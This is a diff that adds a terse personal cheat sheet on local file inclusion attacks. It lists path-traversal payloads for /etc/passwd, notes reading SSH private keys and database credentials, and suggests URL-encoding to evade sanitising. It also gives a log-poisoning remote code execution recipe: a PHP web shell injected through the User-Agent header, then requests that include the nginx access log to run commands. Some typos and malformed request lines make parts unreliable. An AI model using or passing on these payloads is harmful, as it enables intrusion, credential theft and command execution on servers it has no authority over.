@@ -1,0 +1,26 @@
+
+
+ LFI - just read local file data of id_rsa | and sensitive data exposure of username | password | database
+
+	manual | automatic (lfisuite of brupsuite)
+	
+	payload: /etc/passwd
+			 ../../etc/passwd
+			 ...//....//..../etc/passwd
+			 
+	use urlencoding to avoding sanitizing and use lfi wrappers from github allpayloadthings
+
+	ffi rce exploit
+		change user-agent random value while sending request using brupsuite then see response
+		and php payload with header
+		
+		GET /index.php?lag=/var/log/ngix/access.log?cmd=ls http/1.1
+		GET /index.php?lag=/var/log/ngix/access.log?cmd=cat index.php http/1.1		
+		
+		user-agent: <?php system($_GET['cmd']);?>
+		
+
+
+  
+		
+	
